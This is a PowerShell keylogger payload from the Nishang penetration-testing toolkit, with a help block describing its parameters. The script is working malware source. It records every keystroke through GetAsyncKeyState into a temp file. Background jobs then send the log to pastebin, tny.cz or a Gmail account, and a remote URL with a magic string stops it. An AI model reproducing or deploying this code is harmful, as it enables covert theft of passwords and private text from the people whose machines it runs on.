<#
.SYNOPSIS
Nishang Payload which logs keys.

.DESCRIPTION
This payload logs a user's keys and writes them to file key.log (I know its bad :|) in user's temp directory.
The keys are than pasted to pastebin|tinypaste|gmail|all as per selection. Saved keys could then be decoded
using the Parse_Key script in nishang.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.PARAMETER MagicString
The string which when found at CheckURL will stop the keylogger.

.PARAMETER CheckURL
The URL which would contain the MagicString used to stop keylogging.

.EXAMPLE
PS > .\Keylogger.ps1
The payload will ask for all required options.

.EXAMPLE
PS > .\Keylogger.ps1 <dev_key> <username> <pass> 3 http://example.com stopthis
Use above when using the payload from non-interactive shells or you don't want the payload to ask for any options.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True)] [String]$username,
[Parameter(Position = 2, Mandatory = $True)] [String]$password,
[Parameter(Position = 3, Mandatory = $True)] [String]$keyoutoption,
[Parameter(Position = 4, Mandatory = $True)] [String]$MagicString,
[Parameter(Position = 5, Mandatory = $True)] [String]$CheckURL)

$functions = {

function Keylogger
{
    Param ( [Parameter(Position = 0, Mandatory = $True)] [String]$MagicString,
    [Parameter(Position = 1, Mandatory = $True)] [String]$CheckURL)
    
    $signature = @' 
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@ 
    $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru 
    $check = 0
    while ($true) 
    { 
        Start-Sleep -Milliseconds 40 
        $logged = "" 
        $result="" 
        $shift_state="" 
        $caps_state="" 
        for ($char=1;$char -le 254;$char++) 
        { 
            $vkey = $char 
            $logged = $getKeyState::GetAsyncKeyState($vkey) 
            if ($logged -eq -32767) 
            { 
                if(($vkey -ge 48) -and ($vkey -le 57)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                        if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                        { 
                            $result = "S-" + $vkey 
                        } 
                        else 
                        { 
                            $result = $vkey 
                        } 
                    } 
                elseif(($vkey -ge 64) -and ($vkey -le 90)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    $caps_state = [console]::CapsLock 
                    if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                        $result = $vkey 
                    } 
                } 
                elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                      $result = $vkey 
                    } 
                } 
                else 
                { 
                    $result = $vkey 
                } 
                $now = Get-Date; 
                $logLine = "$result " 
                $filename = "$env:temp\key.log" 
                Out-File -FilePath $fileName -Append -InputObject "$logLine" 

            }
        }
        $check++
        if ($check -eq 6000)
        {
            $webclient = New-Object System.Net.WebClient
            $filecontent = $webclient.DownloadString("$CheckURL")
            if ($filecontent -eq $MagicString)
            {
                break
            }
        }
    }
}

function Keypaste
{
    Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $keyoutoption,
    [Parameter(Position = 1, Mandatory = $True)] [String] $dev_key,
    [Parameter(Position = 2, Mandatory = $True)] [String]$username,
    [Parameter(Position = 3, Mandatory = $True)] [String]$password,
    [Parameter(Position = 4, Mandatory = $True)] [String]$MagicString,
    [Parameter(Position = 5, Mandatory = $True)] [String]$CheckURL)
    $dev_key
    $username
    $password
    $check = 0
    while($true) 
    { 
        $read = 0
        Start-Sleep -Seconds 5 
        $pastevalue=Get-Content $env:temp\key.log 
        $read++
        if ($read -eq 30)
        {
            Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
            $read = 0
        }
        $now = Get-Date; 
        $name = $env:COMPUTERNAME 
        $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
        $session_key 
        Function Post_http($url,$parameters) 
        { 
            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
            $http_request.open("POST", $url, $false) 
            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
            $http_request.setRequestHeader("Content-length", $parameters.length); 
            $http_request.setRequestHeader("Connection", "close") 
            $http_request.send($parameters) 
            $script:session_key=$http_request.responseText 
            $session_key 
        } 

        function Get-MD5()
        {
            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
            return $hash
        }

        if ($keyoutoption -eq "1")
        {
            Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
            Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
        }
        
        elseif ($keyoutoption -eq "2")
        {
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $filename = "$env:TEMP\key.log"
            $smtpserver = “smtp.gmail.com”
            $msg = new-object Net.Mail.MailMessage
            $att = new-object Net.Mail.Attachment($filename)
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
            $msg.From = “$username@gmail.com”
            $msg.To.Add(”$username@gmail.com”)
            $msg.Subject = $paste_name
            $msg.Body = “New keys have arrived. Check the attachment.”
            $msg.Attachments.Add($att)
            $smtp.Send($msg)
        }

        elseif ($keyoutoption -eq "3")
        {
            
            $hash = Get-MD5
            Post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
        }

        $check++
        if ($check -eq 6000)
        {
            $webclient = New-Object System.Net.WebClient
            $filecontent = $webclient.DownloadString("$CheckURL")
            if ($filecontent -eq $MagicString)
            {
                break
            }
        }
    }
}
}



start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5]} -ArgumentList @($keyoutoption,$dev_key,$username,$password,$MagicString,$CheckURL)
start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)

